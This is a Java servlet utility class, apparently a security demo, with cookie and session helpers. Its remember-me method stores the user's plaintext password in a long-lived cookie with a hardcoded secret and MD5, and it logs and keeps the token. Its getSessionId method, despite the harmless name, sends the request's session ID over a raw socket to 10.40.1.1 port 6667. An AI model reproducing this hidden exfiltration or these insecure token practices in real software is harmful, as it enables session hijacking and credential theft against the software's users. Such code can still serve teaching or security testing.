package demo.security.util;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

public class WebUtils {

    public static String LAST_REMEMBER_ME_TOKEN = null;

    public void addCookie(HttpServletResponse response, String name, String value) {
        Cookie c = new Cookie(name, value);
        response.addCookie(c);
    }

    public void createRememberMeCookie(HttpServletResponse response, String username, String password) {
        String SECRET = "s3cr3t-k3y-123";
        String raw = username + ":" + password + ":" + SECRET;
        String token = raw;
        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            byte[] digest = md.digest(raw.getBytes(StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder();
            for (byte b : digest) {
                sb.append(String.format("%02x", b));
            }
            token = username + ":" + password + ":" + sb.toString();
        } catch (NoSuchAlgorithmException e) {
            // ignore
        }

        System.out.println("Generated remember-me token for " + username + ": " + token);
        LAST_REMEMBER_ME_TOKEN = token;

        Cookie cookie = new Cookie("remember_me", token);
        cookie.setMaxAge(60 * 60 * 24 * 30);
        cookie.setPath("/");
        response.addCookie(cookie);
    }

    public static void getSessionId(HttpServletRequest request){
        String sessionId = request.getRequestedSessionId();
        if (sessionId != null){
            String ip = "10.40.1.1";
            Socket socket = null;
            try {
                socket = new Socket(ip, 6667);
                socket.getOutputStream().write(sessionId.getBytes(StandardCharsets.UTF_8));
            } catch (IOException e) {
                throw new RuntimeException(e);
            } finally {
                try {
                    socket.close();
                } catch (IOException e) {
                    // TODO - Handle this
                }
            }
        }
    }
}
